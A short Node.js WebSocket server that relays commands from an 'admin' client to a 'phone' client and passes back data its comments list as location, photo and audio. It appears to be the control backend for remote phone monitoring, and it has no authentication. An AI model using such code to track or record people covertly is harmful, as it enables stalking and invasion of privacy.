const express = require('express');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let adminSocket = null;
let phoneSocket = null;

wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            // Register who is connecting
            if (data.type === 'register') {
                if (data.role === 'admin') {
                    adminSocket = ws;
                    console.log('Admin connected');
                    ws.send(JSON.stringify({type: 'registered', role: 'admin'}));
                    if (phoneSocket) {
                        adminSocket.send(JSON.stringify({type: 'phone-online'}));
                    }
                } else if (data.role === 'phone') {
                    phoneSocket = ws;
                    console.log('Phone connected');
                    ws.send(JSON.stringify({type: 'registered', role: 'phone'}));
                    if (adminSocket) {
                        adminSocket.send(JSON.stringify({type: 'phone-online'}));
                    }
                }
            }

            // Admin → Phone (commands)
            else if (data.type === 'command' && phoneSocket) {
                phoneSocket.send(JSON.stringify(data));
            }

            // Phone → Admin (data: location, photo, audio)
            else if (data.type === 'data' && adminSocket) {
                adminSocket.send(JSON.stringify(data));
            }

        } catch (e) {
            console.log('Error:', e.message);
        }
    });

    ws.on('close', () => {
        if (ws === adminSocket) {
            adminSocket = null;
            console.log('Admin disconnected');
        }
        if (ws === phoneSocket) {
            phoneSocket = null;
            console.log('Phone disconnected');
            if (adminSocket) {
                adminSocket.send(JSON.stringify({type: 'phone-offline'}));
            }
        }
    });
});

app.get('/', (req, res) => res.send('Server running!'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Server on port ' + PORT));

// Keep alive
setInterval(() => console.log('alive'), 240000);
